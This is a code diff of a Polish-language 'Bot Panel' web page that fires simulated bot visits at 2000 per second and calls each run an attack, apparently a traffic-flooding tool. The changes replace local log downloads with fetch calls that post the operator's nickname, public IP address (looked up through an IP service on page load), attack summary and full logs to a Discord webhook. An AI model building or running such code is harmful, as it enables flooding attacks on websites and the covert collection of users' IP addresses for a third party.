@@ -2,7 +2,7 @@
 <html lang="pl">
 <head>
 <meta charset="UTF-8" />
-<title>Bot Panel z zapisem logów i wysyłką</title>
+<title>Bot Panel z wysyłką logów na Discord</title>
 <style>
   body { font-family: monospace; background:#111; color:#0f0; padding:20px; }
   #mainPanel { max-width: 600px; margin: auto; padding:20px; border: 1px solid #0f0; border-radius:8px; }
@@ -55,9 +55,6 @@ Korzystając z tego narzędzia oświadczasz, że:
   <button id="startBots" disabled>Start boty</button>
   <button id="stopBots" disabled>Stop boty</button>
 
-  <button id="downloadTxt" style="display:none;">Pobierz podsumowanie .txt</button>
-  <button id="downloadJson" style="display:none;">Pobierz logi .json</button>
-
   <div id="log"></div>
   <div id="summary"></div>
 </div>
@@ -71,8 +68,6 @@ Korzystając z tego narzędzia oświadczasz, że:
   const stopBtn = document.getElementById('stopBots');
   const logDiv = document.getElementById('log');
   const summaryDiv = document.getElementById('summary');
-  const downloadTxtBtn = document.getElementById('downloadTxt');
-  const downloadJsonBtn = document.getElementById('downloadJson');
 
   const visitsPerSecond = 2000;
   const delay = 1000 / visitsPerSecond;
@@ -122,19 +117,6 @@ Korzystając z tego narzędzia oświadczasz, że:
     }
   }
 
-  async function sendWebhook(content) {
-    try {
-      await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content })
-      });
-      log("Dane wysłane na webhook.");
-    } catch(e) {
-      log("Błąd wysyłania na webhook.");
-    }
-  }
-
   function updateStartBtn() {
     startBtn.disabled = !(acceptCheckbox.checked && nickInput.value.trim() !== "");
   }
@@ -165,13 +147,15 @@ Korzystając z tego narzędzia oświadczasz, że:
     logData = [];
     summaryDiv.style.display = 'none';
     logDiv.textContent = '';
-    downloadTxtBtn.style.display = 'none';
-    downloadJsonBtn.style.display = 'none';
     startTime = performance.now();
 
     log("Start botów...");
 
-    await sendWebhook(`Użytkownik **${nick}** rozpoczął atak z IP: \`${userIP || 'brak danych'}\``);
+    await fetch(webhookURL, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ content: `Użytkownik **${nick}** rozpoczął atak z IP: \`${userIP || 'brak danych'}\`` })
+    });
 
     startBtn.disabled = true;
     stopBtn.disabled = false;
@@ -228,10 +212,35 @@ Data: ${date.toLocaleString()} (${date.getMilliseconds()} ms)
     summaryDiv.textContent = summary;
     summaryDiv.style.display = 'block';
 
-    await sendWebhook(summary);
+    const txtContent = `Podsumowanie ataku
+Użytkownik: ${nickInput.value.trim()}
+IP: ${userIP || "brak danych"}
+Data: ${date.toLocaleString()}
+Czas trwania: ${durationMs} ms
+Wysłano botów: ${botCounter}
+Sukcesów: ${successCount}
+Błędów: ${errorCount}
+`;
 
-    downloadTxtBtn.style.display = 'inline-block';
-    downloadJsonBtn.style.display = 'inline-block';
+    const fullTxt = txtContent + "\nLog:\n" + logData.map(e => {
+      const d = new Date(e.time);
+      return `[${d.toLocaleTimeString('pl-PL', {hour12:false})}.${d.getMilliseconds().toString().padStart(3,'0')}] ${e.message}`;
+    }).join('\n');
+
+    const jsonContent = JSON.stringify(logData, null, 2);
+
+    // Wyślij logi jako 2 wiadomości na Discord webhook
+    await fetch(webhookURL, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ content: "**Logi:**\n```json\n" + jsonContent.slice(0, 1900) + "\n```" })
+    });
+
+    await fetch(webhookURL, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ content: "**Dane:**\n```txt\n" + fullTxt.slice(0, 1900) + "\n```" })
+    });
 
     startBtn.disabled = false;
     stopBtn.disabled = true;
@@ -240,40 +249,20 @@ Data: ${date.toLocaleString()} (${date.getMilliseconds()} ms)
     acceptCheckbox.disabled = false;
   };
 
-  downloadTxtBtn.onclick = () => {
-    const nick = nickInput.value.trim();
-    const ip = userIP || "brak danych";
-    const date = new Date().toLocaleString();
-    const durationMs = Math.round(performance.now() - startTime);
-
-    let txtContent = `Podsumowanie ataku\nUżytkownik: ${nick}\nIP: ${ip}\nData: ${date}\nCzas trwania: ${durationMs} ms\nWysłano botów: ${botCounter}\nSukcesów: ${successCount}\nBłędów: ${errorCount}\n\nLog:\n`;
-
-    logData.forEach(e => {
-      txtContent += `[${new Date(e.time).toLocaleTimeString('pl-PL', {hour12:false})}.${new Date(e.time).getMilliseconds().toString().padStart(3,'0')}] ${e.message}\n`;
-    });
-
-    const blob = new Blob([txtContent], {type: "text/plain"});
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = `atack_summary_${nick}_${Date.now()}.txt`;
-    a.click();
-  };
-
-  downloadJsonBtn.onclick = () => {
-    const jsonContent = JSON.stringify(logData, null, 2);
-    const blob = new Blob([jsonContent], {type: "application/json"});
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = `attack_log_${nickInput.value.trim()}_${Date.now()}.json`;
-    a.click();
-  };
-
-  window.addEventListener('load', fetchIP);
-
-  nickInput.addEventListener('input', updateStartBtn);
-  acceptCheckbox.addEventListener('change', updateStartBtn);
+  window.addEventListener('load', async () => {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      userIP = data.ip;
+      log(`Twój IP to: ${userIP}`);
+    } catch(e) {
+      log("Nie udało się pobrać IP");
+    }
+  });
 
   updateStartBtn();
+  nickInput.addEventListener('input', updateStartBtn);
+  acceptCheckbox.addEventListener('change', updateStartBtn);
 })();
 </script>
 
